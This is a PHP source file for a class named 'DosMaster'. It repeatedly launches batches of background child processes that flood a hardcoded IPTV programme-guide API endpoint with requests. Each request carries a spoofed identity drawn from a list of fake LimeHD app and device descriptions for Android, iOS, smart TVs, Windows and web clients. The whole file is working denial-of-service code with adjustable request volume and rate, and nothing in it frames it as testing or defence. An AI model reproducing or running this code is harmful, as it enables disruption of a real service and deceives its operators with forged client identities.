<?php

class DosMaster
{
    private $url = "https://plt1.iptv2021.com:81/api/v4/epg?id=105&epg=1&epg_from=0&epg_limit=1&tz=5";
    private $agents = [
        '{"sdk":25,"version_name":"1.6.1","version_code":216,"platform":"android","device_id":"123123","name":"YOUR_DEVICE_NAME","app":"tv.limehd.stb"}',
        '{"platform":"android","app":"com.infolink.limeiptv","version_name":"4.9.1","version_code":694,"sdk":"29","name":"AQM-L21A%2BAQM-LX1","device_id":"7b0c4d48563478534765384738cc09f7a1"}',
        '{"version_name":"3.11.1","version_code":"31101","platform":"ios","name":"iPhone20SuperMAX","device_id":"DS75E1C2-40D9-40AD-84B5-2FB52BB380GH","app":"com.infolink.LimeHDTV"}',
        '{"version_name":"2.2.0","version_code":"220","platform":"smart","device_id":"G5RK3YUAEQQSF","guid":"904bb325-ef67-4f30-b2ad-121c3e3c7c10","name":"Tizen Samsung UE32N4500"}',
        '{"version_name":"2.2.2","version_code":"222","platform":"smart","device_id":"","guid":"d657dd44-6f63-435a-8b01-341210bcee2a","name":"webOs 32LF650V-ZA"}',
        '{"version_name":"2.2.2","version_code":"222","platform":"smart","device_id":"","guid":"d657dd44-6f63-435a-8b01-341210bcee2a","name":"NetCast 32LF650V-ZA"}',
        '{"version_name":"3.11.1","version_code":"31101","platform":"windows","name":"iPhone20SuperMAX","device_id":"DS75E1C2-40D9-40AD-84B5-2FB52BB380GH","app":"tv.limehd.win"}',
        '{"platform":"web","app":"limehd.tv"}',
    ];
    private $childrenCnt = 50;
    private $requestsCnt = 10;
    private $secondsCnt = 0;
    private $logFolder = '';
    private $logFileName = '';

    private $reqCnt = 0;
    private $secCnt = 0;

    private $errors = [];

    public function __construct($cnf = [])
    {
        foreach ($cnf as $k => $v) {
            if (isset($this->$k)) {
                $this->$k = $v;
            }
        }

        if (!$this->logFolder) {
            $this->logFolder = str_replace("lib", "logs", __DIR__);
        }

        if (!is_dir($this->logFolder)) {
            if (!mkdir($this->logFolder, 0755)) {
                print "Cannot create logs folder $this->logFolder";
                throw new Exception("Cannot create logs folder $this->logFolder");
            }
        }

        if (!$this->logFileName) {
            $this->logFileName = "dm-" . date("Y-m-d-H-i-s-u") . ".log";
        }

        $this->secCnt = $this->secondsCnt;
        $this->reqCnt = $this->requestsCnt;
    }

    public function getlogFileName()
    {
        return $this->logFileName;
    }

    public function run()
    {
        if ($this->secondsCnt) {
            $this->childrenCnt = floor($this->requestsCnt / $this->secondsCnt);
            // if ($this->childrenCnt > 1000) $this->childrenCnt = 1000; 
        }

        $url = base64_encode($this->url);

        $acnt = count($this->agents);

        while ($this->reqCnt > 0) {
            for ($c = 0; $c < $this->childrenCnt; $c++) {
                if ($this->reqCnt-- <= 0) {
                    break;
                }
                $userAgent = base64_encode($this->agents[rand(0, $acnt - 1)]);
                $cmd = "cd " . __DIR__ . "; php dos-child.php {$url} {$userAgent}";
                // print "$cmd\n";
                `$cmd >> {$this->logFolder}/{$this->logFileName} &`; // > /dev/null 2>/dev/null & - to not wait the response
            }
            if ($this->reqCnt > 0) {
                sleep(1);
            } else {
                break;
            }
            if ($this->secCnt && $this->secCnt-- < 0) {
                break;
            }
        }
        
    }

}